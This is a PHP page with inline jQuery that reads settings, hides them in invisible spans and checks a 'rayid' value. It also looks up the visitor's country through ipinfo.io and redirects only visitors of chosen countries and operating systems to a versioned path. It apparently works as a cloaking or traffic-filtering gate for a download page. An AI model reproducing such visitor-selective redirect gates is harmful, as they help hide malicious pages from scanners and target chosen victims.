<?php

// Load JSON settings file
$settingsFile = './api/settings.json'; // Path to the settings file
$settingsFileStr = file_get_contents($settingsFile);
$settings = json_decode($settingsFileStr, false);

$pageStatus = $settings->PageStatus;
$GEO = $settings->GEO;
$BlockedGEO = $settings->BlockedGEO;
$settingOS = $settings->OS;
$version = $settings->Version->Enabled;

?>

<style type="text/css">
	span {
		display: none;
	}
</style>

<span id="pageStatus"> <?php echo $pageStatus; ?> </span>
<span id="GEO"> <?php echo json_encode($GEO); ?> </span>
<span id="BlockedGEO"> <?php echo json_encode($BlockedGEO); ?> </span>
<span id="settingOS"> <?php echo json_encode($settingOS); ?> </span>
<span id="version"> <?php echo $version; ?> </span>


<script type="text/javascript" src="./V3/assets/js/jquery.min.js"></script>
<script type="text/javascript">

	let isDownload = false;
	let country_code = '';

	const pageStatus = $('#pageStatus').text().trim();
	const GEO = JSON.parse( $('#GEO').text() );
	const BlockedGEO = JSON.parse( $('#BlockedGEO').text() );
	const settingOS = JSON.parse( $('#settingOS').text() );
	const version = $('#version').text().trim();

	$.ajax({
		type: 'POST',
	    url: '/api/check_rayid.php',
	    data: JSON.stringify({ rayid: '' }),
	    contentType: 'application/json', // Indicate that you're sending JSON
	    success: function(res) {
			if (res == '10') {
				isDownload = true;
			}
			$.get('https://ipinfo.io/json', function(ipinfo) {
				country_code = ipinfo.country;

				////////////// Middleware Run //////////////

				if (pageStatus == 'ON' && settingOS.includes(OS) && (GEO.includes(country_code) || GEO.includes('100')) && !BlockedGEO.includes(country_code) && isDownload == false) {
					location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '' + '/' + version);
				}
				////////////////////////////////////////////
			})
		}
	})


	// get OS
	const OS = getOS();
	function getOS() {
		const userAgent = navigator.userAgent;
		if (/Windows/i.test(userAgent)) return 'Windows';
		if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
		if (/Android/i.test(userAgent)) return 'Android';
		if (/iPhone|iPad/i.test(userAgent)) return 'iPhone';
		return 'Unknown OS';
	}


</script>
